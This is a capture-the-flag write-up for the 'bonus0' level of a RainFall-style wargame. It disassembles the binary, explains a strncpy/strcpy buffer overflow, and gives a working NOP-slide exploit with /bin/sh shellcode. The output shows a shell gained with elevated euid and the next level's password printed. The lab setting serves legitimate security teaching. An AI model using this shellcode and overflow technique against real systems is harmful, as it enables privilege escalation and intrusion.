(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    $0x80486a4,%ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx
   0x0804856f <+81>:	mov    $0x0,%eax
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:	mov    %edx,%edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax
   0x08048582 <+100>:	add    0x8(%ebp),%eax
   0x08048585 <+103>:	movzwl (%ebx),%edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.




Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
 -
1234567890987654321



AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
PPPPPPPPPPPPPPPPPPPPP


p reads 4096 bytes from STDIN and strncpy returns the first 20 bytes.
then pp calls strcpy on the return of p strncpy and it's non null terminated.

This means that there is the possibility of exploiting strcpy with a buffer 
overflow.

strcpy will copy s1 into s2 in memory and overwrite the EIP return address.
This will lead to a segmentation fault.


The shellcode we found is 23bytes long :

shellcode = "x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

(gdb) disas p
Dump of assembler code for function p:
   ...
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax

gdb) b *p + 28
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe670:	0x00000000

We know that the buffer start at the address 0xbfffe580
We can skip to our shellcode by overwrite eip with NOP slide.
We can go anywhere in this area but still in the NOP area.
We can't go under 58 NOP slide or we have a segmentation fault.

First arg :
(python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' 
Our NOP + shellcode


Second arg :
python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")') | ./bonus0

With the B we reach EIP, then we overwrite it with our malicious buffer address
and then on last byte to fill the buffer

bonus0@RainFall:~$ (python -c 'print ("\x90" * 300 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")' ; python -c 'print ("B" * 14 + "\x80\xe7\xff\xbf" + "B")') | ./bonus0
 -
 -
��������������������BBBBBBBBBBBBBB����B BBBBBBBBBBBBBB����B
$ id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
$



We need that last B in the second arg, otherwise we get a segfault.
It seems in memory there is a bad alignement :

Without the extra char :

(gdb) x/100x 0xbfffe690 - 100
0xbfffe62c:	0x00000000	0x00000000	0xb7fd0ff4	0x00000000
0xbfffe63c:	0xb7e2b900	0xbffff678	0xb7ff26b0	0xbffff678
0xbfffe64c:	0x00001000	0xbfffe670	0xb7f0a213	0x00000000
0xbfffe65c:	0x080484fc	0xbffff6bc	0xbfffe670	0x00000014
0xbfffe66c:	0x00000000	0x42424242	0x42424242	0x42424242
0xbfffe67c:	0x41414242	0x41004141	0x41414141	0x41414141		// diff here
0xbfffe68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6ac:	0x41414141	0x41414141	0x41414141	0x00000041
0xbfffe6bc:	0x00000000	0x00000000	0x00000000	0x00000000

With the extra char :

gdb) x/100x 0xbfffe690 - 100
0xbfffe62c:	0x00000000	0x00000000	0xb7fd0ff4	0x00000000
0xbfffe63c:	0xb7e2b900	0xbffff678	0xb7ff26b0	0xbffff678
0xbfffe64c:	0x00001000	0xbfffe670	0xb7f0a213	0x00000000
0xbfffe65c:	0x080484fc	0xbffff6bc	0xbfffe670	0x00000014
0xbfffe66c:	0x00000000	0x42424242	0x42424242	0x42424242
0xbfffe67c:	0x41414242	0x00424141	0x41414141	0x41414141		// diff here
0xbfffe68c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe69c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfffe6ac:	0x41414141	0x00616141	0x00000000	0x00000000
0xbfffe6bc:	0x00000000	0x00000000	0x00000000	0x00000000
